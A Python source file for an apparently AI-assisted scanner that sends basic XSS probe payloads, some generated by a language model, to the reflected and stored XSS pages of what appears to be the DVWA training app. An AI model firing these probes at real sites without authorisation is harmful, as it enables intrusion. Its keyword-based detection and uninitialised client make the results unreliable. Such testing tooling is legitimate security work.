from typing import Dict, Any, Optional
import requests
from datetime import datetime
import logging
from ..agent import Agent
from ..task import Task
import os
from openai import OpenAI

class XSSAgent(Agent):
    """AI-powered agent for XSS testing."""
    
    def __init__(self):
        super().__init__(
            id="xss-agent-1",
            name="XSS Agent",
            capabilities={"xss", "web_security"}
        )
        self.logger = logging.getLogger(__name__)
        
    def _execute_specific_test(self, task: Task) -> Dict[str, Any]:
        """Execute XSS testing with AI guidance."""
        self.logger.info(f"Starting XSS test for task {task.id}")
        
        target = task.parameters.get("target")
        session = task.parameters.get("session")
        
        if not target or not session:
            raise ValueError("Target URL or session not specified")
            
        findings = []
        
        # Get AI-generated test payloads
        payloads_response = self.client.chat.completions.create(
            model="gpt-3.5-turbo",
            messages=[
                {"role": "system", "content": "You are a security expert. Generate a list of XSS payloads for testing."},
                {"role": "user", "content": "Generate 5 XSS payloads for testing web forms."}
            ]
        )
        
        ai_payloads = payloads_response.choices[0].message.content.split("\n")
        
        # Combine AI-generated payloads with known effective ones
        test_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            *ai_payloads
        ]
        
        # Test reflected XSS
        for payload in test_payloads:
            try:
                # Get AI guidance for this specific payload
                strategy_response = self.client.chat.completions.create(
                    model="gpt-3.5-turbo",
                    messages=[
                        {"role": "system", "content": "You are a security expert. Suggest how to test this XSS payload effectively."},
                        {"role": "user", "content": f"How should I test this payload: {payload}"}
                    ]
                )
                
                self.logger.info(f"Testing payload: {payload}")
                
                # Execute the test
                response = session.get(
                    target,
                    params={
                        "name": payload,
                        "Submit": "Submit"
                    },
                    verify=False,
                    timeout=10
                )
                
                # Let AI analyze the response
                analysis_response = self.client.chat.completions.create(
                    model="gpt-3.5-turbo",
                    messages=[
                        {"role": "system", "content": "You are a security expert. Analyze this response for signs of XSS vulnerability."},
                        {"role": "user", "content": f"Response content: {response.text}\nStatus code: {response.status_code}\nPayload used: {payload}"}
                    ]
                )
                
                analysis = analysis_response.choices[0].message.content
                
                if "vulnerability" in analysis.lower() or "successful" in analysis.lower():
                    findings.append({
                        "name": "Reflected XSS Vulnerability",
                        "severity": "high",
                        "description": f"Reflected XSS vulnerability detected with payload: {payload}",
                        "ai_analysis": analysis,
                        "remediation": "Implement proper input validation and output encoding",
                        "evidence": response.text[:200]
                    })
                    
            except Exception as e:
                self.logger.error(f"Error testing payload {payload}: {str(e)}")
                
        # Test stored XSS
        stored_xss_url = target.replace("vulnerabilities/xss_r/", "vulnerabilities/xss_s/")
        
        for payload in test_payloads:
            try:
                # Submit stored XSS payload
                response = session.post(
                    stored_xss_url,
                    data={
                        "txtName": payload,
                        "mtxMessage": "XSS Test",
                        "btnSign": "Sign Guestbook"
                    },
                    verify=False,
                    timeout=10
                )
                
                # Check if payload is stored
                view_response = session.get(stored_xss_url, verify=False)
                
                # Let AI analyze the response
                analysis_response = self.client.chat.completions.create(
                    model="gpt-3.5-turbo",
                    messages=[
                        {"role": "system", "content": "You are a security expert. Analyze this response for signs of stored XSS vulnerability."},
                        {"role": "user", "content": f"Response content: {view_response.text}\nStatus code: {view_response.status_code}\nPayload used: {payload}"}
                    ]
                )
                
                analysis = analysis_response.choices[0].message.content
                
                if "vulnerability" in analysis.lower() or "successful" in analysis.lower():
                    findings.append({
                        "name": "Stored XSS Vulnerability",
                        "severity": "critical",
                        "description": f"Stored XSS vulnerability detected with payload: {payload}",
                        "ai_analysis": analysis,
                        "remediation": "Implement proper input validation, output encoding, and content security policy",
                        "evidence": view_response.text[:200]
                    })
                    
            except Exception as e:
                self.logger.error(f"Error testing stored payload {payload}: {str(e)}")
                
        return {
            "status": "completed",
            "findings": findings,
            "timestamp": datetime.now().isoformat()
        }
        
    async def analyze_results(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Use AI to analyze test results and provide recommendations."""
        try:
            analysis_response = await self.client.chat.completions.create(
                model="gpt-3.5-turbo",
                messages=[
                    {"role": "system", "content": "You are a security expert specialized in XSS vulnerabilities. Analyze these test results and provide detailed recommendations."},
                    {"role": "user", "content": str(results)}
                ]
            )
            
            return {
                "summary": analysis_response.choices[0].message.content,
                "timestamp": datetime.now().isoformat(),
                "findings_count": len(results.get("findings", [])),
                "risk_level": "High" if results.get("findings") else "Low"
            }
            
        except Exception as e:
            self.logger.error(f"Error in AI analysis: {str(e)}")
            return {
                "error": str(e),
                "timestamp": datetime.now().isoformat()
            } 